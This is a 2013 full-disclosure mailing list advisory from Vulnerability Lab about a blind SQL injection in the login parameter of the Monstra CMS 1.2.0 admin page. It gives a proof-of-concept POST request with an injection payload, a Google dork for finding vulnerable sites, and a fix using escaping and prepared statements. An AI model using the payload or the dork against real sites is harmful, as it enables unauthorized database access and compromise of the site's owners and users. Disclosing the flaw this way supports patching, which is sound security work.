
Date: Fri, 20 Sep 2013 14:37:26 +0200
From: Vulnerability Lab <research@...nerability-lab.com>
To: full-disclosure@...ts.grok.org.uk
Subject: Monstra CMS v1.2.0 - Blind SQL Injection
	Vulnerability

Title:
======
Monstra CMS v1.2.0 - Blind SQL Injection Vulnerability


Date:
=====
2013-09-20


References:
===========
http://www.vulnerability-lab.com/get_content.php?id=1081


VL-ID:
=====
1081


Common Vulnerability Scoring System:
====================================
8.7


Introduction:
=============
Monstra is a simple and light-weighted Content Management System written in PHP! A Content Management System (CMS) is a software that 
allows publishing, editing and modifying content on your Web site. Content Management System provide procedures to manage workflow in 
a collaborative environment.

- Small business Web sites
- Personal or family homepages
- School and church Web sites

(Copy of the Vendor Homepage: http://monstra.org/about )


Abstract:
=========
An independent vulnerability laboratory researcher (linc0ln.dll) discovered a blind sql injection web vulnerability in the Monstra v1.2.0 CMS.


Report-Timeline:
================
2013-09-20:    Public Disclosure (linc0ln.dll)


Status:
========
Published


Affected Products:
==================
Sergey Romanenko
Product: Monstra Content Management System 1.2.0


Exploitation-Technique:
=======================
Remote


Severity:
=========
Critical


Details:
========
A blind SQL Injection web vulnerability is detected in the official Monstra v1.2.0 Content Management System.
The vulnerability allows remote attackers to inject own sql commands to compromise the vulnerable application dbms.

The blind sql injection web vulnerability is located in the login submit (POST) module. Attackers are able to inject 
own sql commands by manipulation of the the `login id` parameter. 

Exploitation of the blind sql vulnerability does not require user interaction or a privileged application user account.
Successful exploitation of the sql injection vulnerability results in database management system & application compromise.

Vulnerable Module(s):
				[+] Admin Auth (./admin)

Vulnerable Parameter(s):
				[+] login


Proof of Concept:
=================
The blind sql injection web vulnerability can be exploited by remote attackers without privileged application user account 
and user interaction. For demonstration or reproduce ...

Example: POST
login=[SQL INJECTION]&login_submit=Enter&password=[x] 

PoC: POST
login=-1' or 85 = '83&login_submit=Enter&password=lincoln.dll


POST Request:
POST /admin/ HTTP/1.1
Content-Length: 72
Content-Type: application/x-www-form-urlencoded
X-Requested-With: XMLHttpRequest
Cookie: PHPSESSID=f6bd4782f77e4027d3975d32c414a36d
Host: XXX
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)
Accept: */*
login=-1' or 85 = '83&login_submit=Enter&password=lincoln.dll

Server Response:
HTTP/1.1 200 OK
Date: Thu, 19 Sep 2013 14:27:25 GMT
Server: Apache
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
Pragma: no-cache
Vary: Accept-Encoding,User-Agent
Connection: close
Content-Type: text/html; charset=UTF-8
Content-Length: 4456


Goole Dork(s):	"Powered by Monstra 1.2.0"


Solution:
=========
The vulnerability can be patched by a secure escaping the login input via POST request method.
Also use a prepared statement to clean up the vulnerable code section.


Risk:
=====
The security risk of the remote blind sql injection web vulnerability is estimated as critical.


Credits:
========
Independent Vulnerability Researcher - linc0ln.dll


Disclaimer:
===========
The information provided in this advisory is provided as it is without any warranty. Vulnerability Lab disclaims all warranties, 
either expressed or implied, including the warranties of merchantability and capability for a particular purpose. Vulnerability-
Lab or its suppliers are not liable in any case of damage, including direct, indirect, incidental, consequential loss of business 
profits or special damages, even if Vulnerability-Lab or its suppliers have been advised of the possibility of such damages. Some 
states do not allow the exclusion or limitation of liability for consequential or incidental damages so the foregoing limitation 
may not apply. We do not approve or encourage anybody to break any vendor licenses, policies, deface websites, hack into databases 
or trade with fraud/stolen material.

Domains:    www.vulnerability-lab.com   	- www.vuln-lab.com			       - www.evolution-sec.com
Contact:    admin@...nerability-lab.com 	- research@...nerability-lab.com 	       - admin@...lution-sec.com
Section:    www.vulnerability-lab.com/dev 	- forum.vulnerability-db.com 		       - magazine.vulnerability-db.com
Social:	    twitter.com/#!/vuln_lab 		- facebook.com/VulnerabilityLab 	       - youtube.com/user/vulnerability0lab
Feeds:	    vulnerability-lab.com/rss/rss.php	- vulnerability-lab.com/rss/rss_upcoming.php   - vulnerability-lab.com/rss/rss_news.php

Any modified copy or reproduction, including partially usages, of this file requires authorization from Vulnerability Laboratory. 
Permission to electronically redistribute this alert in its unmodified form is granted. All other rights, including the use of other 
media, are reserved by Vulnerability-Lab Research Team or its suppliers. All pictures, texts, advisories, source code, videos and 
other information on this website is trademark of vulnerability-lab team & the specific authors or managers. To record, list (feed), 
modify, use or edit our material contact (admin@...nerability-lab.com or research@...nerability-lab.com) to get a permission.

				Copyright Â© 2013 | Vulnerability Laboratory [Evolution Security]



-- 
VULNERABILITY LABORATORY RESEARCH TEAM
DOMAIN: www.vulnerability-lab.com
CONTACT: research@...nerability-lab.com


_______________________________________________
Full-Disclosure - We believe in it.
Charter: http://lists.grok.org.uk/full-disclosure-charter.html
Hosted and sponsored by Secunia - http://secunia.com/
